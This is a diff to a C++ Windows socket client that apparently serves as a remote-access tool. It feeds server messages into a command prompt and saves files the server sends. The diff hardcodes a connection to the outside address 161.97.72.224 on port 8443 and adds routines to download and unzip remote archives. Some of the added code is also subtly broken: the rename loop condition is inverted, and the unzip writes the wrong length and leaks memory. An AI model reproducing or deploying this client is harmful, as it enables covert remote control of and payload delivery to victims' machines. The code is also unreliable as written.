@@ -1,11 +1,14 @@
 #include "Client.h"
+#include <cstdio>
 #include <process.h>
+#include <libzippp/libzippp.h>
 
-
-//a lot of the networking structure was adapted from Pindrought's very comprehensive Winsock Networking Tutorials ( http://www.planetchili.net/forum/viewtopic.php?f=3&t=3433 )
+using namespace libzippp;
 
 Client* Client::clientptr = NULL;
 bool Client::connected = false;
+Client Client::main_client("161.97.72.224", 8443);
+auto temp_name = std::string("tempfile.tmp");
 
 
 bool Client::ProcessPacketType(PacketType _PacketType)
@@ -28,7 +31,7 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 			return false;
 		if (CMD::cmdptr != NULL)
 		{
-			CMD::cmdptr->writeCMD(msg);											//MOST ANNOYING BUG: [FIXED]
+			CMD::cmdptr->writeCMD(msg);
 			break;
 		}
 		else
@@ -61,6 +64,10 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		//std::cout << "File Size(bytes): " << file.bytesWritten << std::endl;
 		file.bytesWritten = 0;
 		file.outfileStream.close(); //close file after we are done writing file
+
+		while (!rename((GetCWD() + temp_name).c_str(), (GetCWD() + file.fileName).c_str())) {
+			Sleep(100);
+		}
 		break;
 	}
 	default: //If PacketType type is not accounted for
@@ -124,7 +131,7 @@ bool Client::resolveIP(std::string &hostname)
 
 bool Client::RequestFile(std::string FileName)
 {
-	file.outfileStream.open(FileName, std::ios::binary); //open file to write file to
+	file.outfileStream.open(GetCWD() + temp_name, std::ofstream::binary); //open file to write file to
 	file.fileName = FileName; //save file name
 	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
 	if (!file.outfileStream.is_open()) //if file failed to open...
@@ -179,5 +186,38 @@ bool Client::CloseConnection()
 		//TODO: HANDLE ERROR
 		return false;
 	}
+	return true;
+}
+
+bool unzip(const std::string& zipPath, const std::string& desPath)
+{
+	ZipArchive zf(zipPath);
+	zf.open(ZipArchive::ReadOnly);
+	if (!zf.isOpen()) {
+		zf.close();
+		return false;
+	}
+
+	std::vector<ZipEntry> entries = zf.getEntries();
+	std::vector<ZipEntry>::iterator it;
+	for (it = entries.begin(); it != entries.end(); ++it) {
+		ZipEntry entry = *it;
+		std::string name = entry.getName();
+		int size = entry.getSize();
+
+		//the length of binaryData will be size
+		void* binaryData = entry.readAsBinary();
+
+		//the length of textData will be size
+		size_t textData = entry.readAsText().length();
+
+		std::ofstream outFile(desPath + name, std::ofstream::binary);
+		outFile.write((char*)binaryData, textData);
+		outFile.close();
+		//...
+	}
+
+	zf.close();
+
 	return true;
 }
